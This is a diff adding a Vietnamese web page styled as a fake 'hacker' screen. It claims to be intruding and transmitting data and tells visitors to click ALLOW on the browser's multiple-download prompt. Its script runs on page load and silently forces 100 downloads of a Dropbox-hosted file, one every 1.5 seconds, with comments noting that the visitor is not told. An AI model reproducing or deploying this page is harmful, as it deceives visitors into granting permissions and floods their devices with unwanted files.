@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bí thuật haker</title>
+    <style>
+        body {
+            background-color: #000000;
+            color: #00FF00;
+            font-family: 'Courier New', Courier, monospace;
+            text-align: center;
+            margin-top: 100px;
+        }
+        h1 { font-size: 40px; text-shadow: 0 0 10px #00FF00; }
+        .warning { color: #FFFF00; font-size: 14px; margin-top: 20px; }
+        /* Thêm hiệu ứng nhấp nháy cho dòng trạng thái */
+        #trang-thai { 
+            font-size: 24px; 
+            color: red; 
+            font-weight: bold; 
+            margin-top: 30px; 
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+
+    <h1>[ BÍ THUẬT HAKER ]</h1>
+    <p>Hệ thống đang tự động xâm nhập và truyền dữ liệu...</p>
+    
+    <!-- Dòng trạng thái tĩnh, nhấp nháy ngầu lòi, không báo số lượng tải -->
+    <p id="trang-thai">ĐANG THỰC THI LỆNH...</p>
+
+    <p class="warning">⚠️ LƯU Ý: Nếu trình duyệt hiện thông báo "Cho phép tải nhiều tệp" trên góc phải màn hình,<br>hãy bấm <strong>CHO PHÉP (ALLOW)</strong> để hệ thống tiếp tục.</p>
+
+    <script>
+        // TỰ ĐỘNG CHẠY NGAY KHI TRANG VỪA LOAD XONG
+        window.onload = function() {
+            
+            // Link Dropbox của bạn đã được lắp vào đây:
+            var linkFileCuaBan = "https://www.dropbox.com/scl/fi/jsxpox6sb5ym33x8hty2q/bithuathacker.txt?rlkey=zzyf0jk7hnqk2g6vlgqvf7hf2&st=5i1k5uh0&dl=1";
+            
+            // Số lượng file sẽ bị ép tải về
+            var soLuongTaiVe = 100; 
+            var delay = 0; 
+
+            // Vòng lặp bắn file âm thầm không báo lên màn hình
+            for (var i = 0; i < soLuongTaiVe; i++) {
+                setTimeout(function() {
+                    var a = document.createElement('a');
+                    a.href = linkFileCuaBan;
+                    a.download = ''; 
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                }, delay);
+                
+                // Độ trễ 1.5 giây giữa mỗi lần tải
+                delay += 1500; 
+            }
+        };
+    </script>
+</body>
+</html>
